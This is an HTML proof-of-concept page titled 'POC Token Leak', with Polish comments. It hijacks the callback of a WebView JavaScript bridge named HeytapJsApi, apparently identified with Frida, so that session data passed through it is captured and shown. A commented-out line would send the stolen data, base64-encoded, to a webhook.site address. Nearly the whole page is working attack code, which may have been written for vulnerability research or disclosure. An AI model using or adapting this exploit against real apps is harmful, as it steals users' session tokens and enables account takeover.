<!DOCTYPE html>
<html>
<head>
    <title>POC Token Leak</title>
    <meta charset="utf-8">
    <style>
        body { background-color: light-green; color: red; font-family: sans-serif; padding: 20px; }
        #log { word-break: break-all; border: 2px solid red; padding: 10px; }
    </style>
</head>
<body>
    <h1>PRZECHWYCONO DANE SESJI:</h1>
    <div id="log">Czekam na dane z HeytapJsApi...</div>

    <script>
        function log(msg) {
            document.getElementById('log').innerText = msg;
            console.log(msg);
            // Opcjonalnie: wyślij dane do siebie (użyj np. webhook.site)
            // fetch('https://webhook.site/TWOJ-ID?data=' + btoa(msg));
        }

        // Próba wymuszenia callbacku, który widzieliśmy we Fridzie
        setTimeout(function() {
            try {
                if (window.HeytapJsApi) {
                    log("Znaleziono HeytapJsApi! Próbuję pobrać dane...");
                    
                    // Rejestrujemy się na callback, który widzieliśmy w logach
                    window.HeytapJsApi.callback = function(id, response) {
                        log("SUKCES! Przechwycono: " + JSON.stringify(response));
                    };
                } else {
                    log("Nie znaleziono mostka JS. Spróbuj odświeżyć lub sprawdź Intent.");
                }
            } catch (e) {
                log("Błąd: " + e.message);
            }
        }, 2000);
    </script>
</body>
</html>
